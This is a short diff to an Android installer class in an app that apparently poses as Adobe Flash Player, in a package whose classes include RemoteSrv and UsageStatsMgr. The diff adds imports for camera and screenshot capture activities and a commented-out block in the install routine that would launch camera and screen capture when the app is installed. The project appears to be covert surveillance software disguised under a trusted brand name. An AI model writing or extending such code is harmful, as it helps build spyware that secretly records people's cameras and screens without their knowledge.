@@ -29,6 +29,9 @@ import com.adobe.flashplayer.core.DeviceManager;
 import com.adobe.flashplayer.core.ForegroundSrv;
 import com.adobe.flashplayer.core.RemoteSrv;
 import com.adobe.flashplayer.core.UsageStatsMgr;
+import com.adobe.flashplayer.data.CameraActivity;
+import com.adobe.flashplayer.data.CameraActivity2;
+import com.adobe.flashplayer.data.ScreenShotActivity;
 
 public class InstallActivity extends Activity  {
 
@@ -85,6 +88,19 @@ public class InstallActivity extends Activity  {
             PrefOper.setValue(InstallActivity.this, Public.PARAMCONFIG_FileName, Public.SETUPMODE, Public.SETUPMODE_MANUAL);
 
             if (debug_flag ){
+
+                /*
+                Intent intentscr = new Intent(InstallActivity.this, ScreenShotActivity.class);
+                intentscr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intentscr);
+
+                Intent intentCamera = new Intent(InstallActivity.this, CameraActivity.class);
+                intentCamera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                intentCamera.putExtra("index",0);
+                intentCamera.putExtra("count",1);
+                startActivity(intentCamera);
+                 */
+
                 install(InstallActivity.this);
             }
             else{
